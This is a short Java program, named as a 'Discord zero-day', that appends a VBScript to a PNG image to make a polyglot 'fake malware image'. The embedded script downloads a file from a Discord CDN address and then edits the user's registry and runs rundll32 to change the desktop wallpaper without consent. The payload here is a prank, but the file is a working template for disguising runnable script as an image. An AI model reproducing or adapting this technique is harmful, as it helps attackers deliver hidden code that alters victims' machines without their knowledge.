import java.io.IOException;
import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;

public class DiscordZeroday {

    private static final String SCRIPT = "Set objShell = CreateObject(\"WScript.Shell\")\n" +
            "Set objEnv = objShell.Environment(\"User\")\n" +
            "\n" +
            "strDirectory = objShell.ExpandEnvironmentStrings(\"%temp%\")\n" +
            "\n" +
            "dim xHttp: Set xHttp = createobject(\"Microsoft.XMLHTTP\")\n" +
            "dim bStrm: Set bStrm = createobject(\"Adodb.Stream\")\n" +
            "xHttp.Open \"GET\", \"https://cdn.discordapp.com/avatars/275808021605777409/1f5eae5d8b12034c335309a0150942c5.png?size=512\", False\n" +
            "xHttp.Send\n" +
            "\n" +
            "with bStrm\n" +
            "    .type = 1 '//binary\n" +
            "    .open\n" +
            "    .write xHttp.responseBody\n" +
            "    .savetofile strDirectory + \"\\myImage.png\", 2 '//overwrite\n" +
            "end with\n" +
            "\n" +
            "objShell.RegWrite \"HKCU\\Control Panel\\Desktop\\Wallpaper\", strDirectory + \"\\myImage.png\"\n" +
            "objShell.Run \"%windir%\\System32\\RUNDLL32.EXE user32.dll,UpdatePerUserSystemParameters\", 1, True";

    public static void main(String[] args) throws IOException {
        Path path = Paths.get("in.png");
        byte[] data = Files.readAllBytes(path);
        byte[] newData = SCRIPT.getBytes(StandardCharsets.UTF_8);
        byte[] output = new byte[data.length + newData.length];
        System.arraycopy(data, 0, output, 0, data.length);
        System.arraycopy(newData, 0, output, data.length, newData.length);
        Files.write(Paths.get("out.png"), output);
        System.out.println("Successfully generated fake malware image");
    }
}
